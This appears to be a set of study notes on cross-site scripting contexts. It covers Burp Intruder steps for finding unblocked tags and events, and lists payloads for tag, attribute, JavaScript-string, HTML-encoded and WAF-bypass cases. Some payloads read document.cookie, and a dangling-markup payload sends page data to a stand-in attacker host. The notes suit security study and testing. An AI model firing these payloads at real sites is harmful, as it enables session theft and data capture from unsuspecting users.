# Cross-site scripting contexts

## XSS between HTML tags

### With most tags and attributes blocked

1. Open Burp's browser and use the `vuln input` in the site. Send the resulting request to Burp Intruder.
2. In Burp Intruder, in the Positions tab, replace the value of the input with: `<>`
3. Visit the XSS cheat sheet and click "Copy tags to clipboard".
4. after get a no blocked element, Go back to the Positions tab in Burp Intruder and replace your input value with: `<body%20$$=1>`
5. Visit the XSS cheat sheet and click "copy events to clipboard".

> Example:  
> `<iframe src="https://YOUR-VULN-SITE.net/?YOUT-VULN-INPUT=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

### With all tags blocked except custom ones

> Example  
> `<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`  
> Or  
> `<script>location = 'https://YOUR-VULN-SITE.net/?YOUT-VULN-INPUT=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>`

### With event handlers and `href` attributes blocked

> Example  
> `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`

## XSS in HTML tag attributes

* close the tag, and introduce a new one.  

> example  
> `"><script>alert(document.domain)</script>`

* If angle brackets are blocked or encoded, so introduce a new attribute that creates a scriptable context, such as an event handler.  

> Example  
> `" autofocus onfocus=alert(document.domain) x="`  

* Show the hidden input
* Inject script in `accesskey` and `onclick` attributes.  

> Example  
> `<input type="hidden" accesskey="X" onclick="alert(1)"> Or <link rel="canonical" accesskey="X" onclick="alert(1)" />`

## XSS into JavaScript

### Terminating the existing script

> context  
> `<script>...var input = 'controllable data here';...</script>`  
> payload  
> `</script><img src=1 onerror=alert(document.domain)>`

### Breaking out of a JavaScript string

> context  
> `<script>...var str = 'controllable data here';...</script>`  
> payloads  
> `'-alert(document.domain)-'`  
> `';alert(document.domain)//` --> `\';alert(document.domain)//`  

> [!NOTE]  
> A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator.

* bypass a WAF by exploiting fetch method and no parentheses function:
  * context: `href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')`
  * Vuln: get the `body` value from URL
  * payloads: `/post%3fpostId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

### Making use of HTML-encoding

* context: `<a href="#" onclick="... var input='controllable data here'; ...">`

* the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

* payload: `&apos;-alert(document.domain)-&apos;`

### XSS in JavaScript template literals

* JavaScript template literals are string literals that allow embedded JavaScript expressions. Template literals are encapsulated in backticks (``) instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.

## Dangling markup injection
  
Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.  

> context  
> `<input type="text" name="input" value="CONTROLLABLE DATA HERE`  
> payload  
> `"><img src='//attacker-website.com?`  

> NOTE  
> Note that the attacker's payload doesn't close the `src` attribute, which is left `"dangling"`. When a browser parses the response, it will look ahead until it encounters a `single quotation mark` to terminate the attribute.  
